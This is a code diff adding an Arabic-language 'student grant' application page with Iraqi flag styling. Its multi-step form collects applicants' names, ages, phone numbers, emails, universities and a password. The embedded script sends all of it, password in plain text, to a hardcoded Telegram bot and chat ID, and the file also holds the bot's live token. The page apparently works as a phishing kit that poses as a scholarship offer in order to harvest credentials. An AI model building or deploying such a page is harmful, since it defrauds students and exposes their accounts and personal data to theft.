@@ -1,0 +1,320 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>تقديم منحة الطلاب</title>
+<style>
+@import url('https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap');
+
+body {
+    font-family: 'Cairo', sans-serif;
+    margin: 0;
+    padding: 0;
+    background: url('https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSSm9kAUecZC9CVUl0cBI3G2Eq6Uiy7gY4cZ_EEn36nrw&s=10') no-repeat center center fixed;
+    background-size: cover;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    min-height: 100vh;
+}
+
+.container {
+    background: rgba(255, 255, 255, 0); /* إزالة الضباب */
+    backdrop-filter: none;
+    padding: 40px 30px;
+    border-radius: 20px;
+    width: 100%;
+    max-width: 600px;
+    box-shadow: 0 8px 30px rgba(0,0,0,0.3);
+    border: 1px solid rgba(255,255,255,0.3);
+    animation: fadeIn 1s ease;
+    margin-bottom: 30px;
+}
+
+label {
+    display: block;
+    margin-top: 15px;
+    font-weight: bold;
+    color: #ffd700; /* النصوص باللون الأصفر */
+    text-shadow: 1px 1px 3px #00000055;
+}
+
+input, select {
+    width: 100%;
+    padding: 12px 15px;
+    margin-top: 5px;
+    border-radius: 12px;
+    border: none;
+    font-size: 16px;
+    outline: none;
+    transition: 0.3s;
+
+    background: rgba(255, 255, 150, 0.35); /* أصفر فاتح أوضح */
+    color: #000; /* النص داخل الحقول أسود */
+}
+
+input:focus, select:focus {
+    box-shadow: 0 0 18px #ffd700;
+    transform: scale(1.03);
+    background: rgba(255, 255, 150, 0.5); /* عند التركيز يصبح أكثر وضوحًا */
+    color: #000; /* النص يبقى أسود عند التركيز */
+}
+
+button {
+    margin-top: 25px;
+    width: 100%;
+    padding: 15px;
+    font-size: 18px;
+    background: linear-gradient(45deg, #ffd700, #ffa500);
+    border: none;
+    border-radius: 15px;
+    cursor: pointer;
+    font-weight: bold;
+    color: #000;
+    transition: 0.4s;
+}
+
+button:hover {
+    background: linear-gradient(45deg, #ffa500, #ffd700);
+    transform: scale(1.05);
+    box-shadow: 0 4px 15px rgba(0,0,0,0.3);
+}
+
+.success, .error {
+    margin-top: 20px;
+    padding: 15px;
+    border-radius: 12px;
+    display: none;
+    text-align: center;
+    font-weight: bold;
+    box-shadow: 0 4px 12px rgba(0,0,0,0.2);
+}
+
+.success { background: #28a745; color: #fff; }
+.error { background: #dc3545; color: #fff; }
+
+.title {
+    font-size: 2rem;
+    font-weight: bold;
+    color: #ffd700;
+    text-align: center;
+    margin: 20px 0;
+    text-shadow: 2px 2px 5px #00000055;
+}
+
+/* العلم العراقي */
+.flag-iraq {
+  width: 360px;
+  height: 216px;
+  margin: 20px auto 20px;
+  border-radius: 12px;
+  overflow: hidden;
+  box-shadow: 0 15px 40px rgba(0,0,0,0.4);
+  transform: rotateX(6deg) rotateY(-6deg);
+  perspective: 1000px;
+  border: 1px solid #999;
+  position: relative;
+  background: #fff;
+}
+
+.flag-iraq .stripe {
+  height: 33.33%;
+  width: 100%;
+  position: relative;
+  box-shadow: inset 0 4px 8px rgba(0,0,0,0.15);
+}
+
+.flag-iraq .red { background: linear-gradient(to bottom, #d91c1c 0%, #a31212 100%); }
+.flag-iraq .white { 
+  background: linear-gradient(to bottom, #ffffff 0%, #f2f2f2 100%);
+  display: flex;
+  justify-content: center;
+  align-items: center;
+}
+.flag-iraq .black { background: linear-gradient(to bottom, #111111 0%, #2c2c2c 100%); }
+
+.flag-iraq .allah-akbar {
+  font-size: 38px;
+  font-weight: 900;
+  color: #007a33;
+  font-family: "Cairo", sans-serif;
+  letter-spacing: 4px;
+  text-shadow: 0 2px 6px rgba(0,0,0,0.35), 0 0 10px rgba(0,122,51,0.45);
+  z-index: 10;
+}
+
+.flag-iraq::before {
+  content: "";
+  position: absolute;
+  inset: 0;
+  background: linear-gradient(45deg, rgba(255,255,255,0.08), transparent);
+  pointer-events: none;
+  border-radius: 12px;
+}
+
+@keyframes fadeIn {
+    from {opacity: 0; transform: translateY(-20px);}
+    to {opacity: 1; transform: translateY(0);}
+}
+
+/* صورة صغيرة متحركة دائريه وشفافة */
+.moving-image {
+    position: fixed;
+    width: 70px;
+    height: 70px;
+    bottom: 30px;
+    left: 0;
+    border-radius: 50%;
+    opacity: 0.7;
+    z-index: 1000;
+    animation: floatMove 8s ease-in-out infinite;
+    pointer-events: none;
+}
+
+@keyframes floatMove {
+    0%   { transform: translate(0, 0) rotate(0deg); }
+    25%  { transform: translate(30px, -20px) rotate(15deg); }
+    50%  { transform: translate(60px, 10px) rotate(-15deg); }
+    75%  { transform: translate(30px, 20px) rotate(10deg); }
+    100% { transform: translate(0, 0) rotate(0deg); }
+}
+</style>
+</head>
+<body>
+
+<!-- صورة صغيرة متحركة -->
+<img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSBcw-iIg5B0FBEtbuWEycfZicq5EZMzsQIeaE14PIMhA&s=10" alt="شعار متحرك" class="moving-image">
+
+<!-- الصفحة الأولى -->
+<div id="page1" class="container">
+    <div class="flag-iraq">
+      <div class="stripe red"></div>
+      <div class="stripe white">
+        <span class="allah-akbar">الله أكبر</span>
+      </div>
+      <div class="stripe black"></div>
+    </div>
+    <h1 class="title">منحة الطلاب</h1>
+    <button id="toPage2">ابدأ التقديم</button>
+</div>
+
+<!-- الصفحة الثانية -->
+<div id="page2" class="container" style="display:none;">
+    <div class="flag-iraq">
+      <div class="stripe red"></div>
+      <div class="stripe white">
+        <span class="allah-akbar">الله أكبر</span>
+      </div>
+      <div class="stripe black"></div>
+    </div>
+    <h2 class="title">معلومات الطالب الأساسية</h2>
+    <form id="formPage2">
+        <label for="name">الاسم الكامل:</label>
+        <input type="text" id="name" required>
+        <label for="age">العمر:</label>
+        <input type="number" id="age" required min="18" max="70">
+        <label for="province">المحافظة:</label>
+        <input type="text" id="province" required>
+        <label for="phone">رقم الهاتف:</label>
+        <input type="text" id="phone" required>
+        <label for="email">البريد الإلكتروني:</label>
+        <input type="email" id="email" required>
+        <label for="password">كلمة السر:</label>
+        <input type="password" id="password" required>
+        <label for="confirmPassword">تأكيد كلمة السر:</label>
+        <input type="password" id="confirmPassword" required>
+        <button type="button" id="toPage3">التالي ➡️</button>
+    </form>
+</div>
+
+<!-- الصفحة الثالثة -->
+<div id="page3" class="container" style="display:none;">
+    <div class="flag-iraq">
+      <div class="stripe red"></div>
+      <div class="stripe white">
+        <span class="allah-akbar">الله أكبر</span>
+      </div>
+      <div class="stripe black"></div>
+    </div>
+    <h2 class="title">معلومات الدراسة</h2>
+    <form id="formPage3">
+        <label for="university">الجامعة:</label>
+        <input type="text" id="university" required>
+        <label for="major">التخصص:</label>
+        <input type="text" id="major" required>
+        <label for="stage">المرحلة:</label>
+        <select id="stage" required>
+            <option value="">اختر المرحلة</option>
+            <option value="أولى">أولى</option>
+            <option value="ثانية">ثانية</option>
+            <option value="ثالثة">ثالثة</option>
+            <option value="رابعة">رابعة</option>
+            <option value="خريج">خريج</option>
+        </select>
+        <button type="submit">إرسال الطلب</button>
+    </form>
+    <div class="success" id="successMsg">تم إرسال الطلب بنجاح!</div>
+    <div class="error" id="errorMsg">حدث خطأ أثناء الإرسال، حاول مرة أخرى.</div>
+</div>
+
+<script>
+const toPage2 = document.getElementById('toPage2');
+const toPage3 = document.getElementById('toPage3');
+const page1 = document.getElementById('page1');
+const page2 = document.getElementById('page2');
+const page3 = document.getElementById('page3');
+
+toPage2.addEventListener('click', () => { page1.style.display='none'; page2.style.display='block'; });
+toPage3.addEventListener('click', () => { page2.style.display='none'; page3.style.display='block'; });
+
+const form = document.getElementById('formPage3');
+const successMsg = document.getElementById('successMsg');
+const errorMsg = document.getElementById('errorMsg');
+
+const TELEGRAM_BOT_TOKEN = '7473529224:AAGNBV63OrUJURctUngouXTxoT8CHjeP57M';
+const TELEGRAM_CHAT_ID = '701577941';
+
+form.addEventListener('submit', function(e){
+    e.preventDefault();
+    const password = document.getElementById('password').value;
+    const confirmPassword = document.getElementById('confirmPassword').value;
+    if(password !== confirmPassword){ alert('⚠️ كلمة السر وتأكيد كلمة السر غير متطابقين'); return; }
+
+    const name = document.getElementById('name').value;
+    const age = document.getElementById('age').value;
+    const province = document.getElementById('province').value;
+    const phone = document.getElementById('phone').value;
+    const email = document.getElementById('email').value;
+    const university = document.getElementById('university').value;
+    const major = document.getElementById('major').value;
+    const stage = document.getElementById('stage').value;
+
+    const message = `
+🎓 *نموذج تقديم منحة الطلاب* 🎓
+👤 الاسم: ${name}
+🎂 العمر: ${age}
+🏙️ المحافظة: ${province}
+📞 الهاتف: ${phone}
+📧 البريد الإلكتروني: ${email}
+🔑 كلمة السر: ${password}
+🏫 الجامعة: ${university}
+📚 التخصص: ${major}
+📖 المرحلة: ${stage}
+✅ تم إرسال الطلب عبر موقع التقديم
+`;
+
+    fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,{
+        method:'POST',
+        headers:{'Content-Type':'application/json'},
+        body:JSON.stringify({chat_id: TELEGRAM_CHAT_ID,text:message,parse_mode:'Markdown'})
+    })
+    .then(res=>res.json())
+    .then(data=>{ if(data.ok){successMsg.style.display='block'; errorMsg.style.display='none'; form.reset();} 
+                  else{successMsg.style.display='none'; errorMsg.style.display='block';}})
+    .catch(()=>{successMsg.style.display='none'; errorMsg.style.display='block';});
+});
+</script>
+
+</body>
+</html>
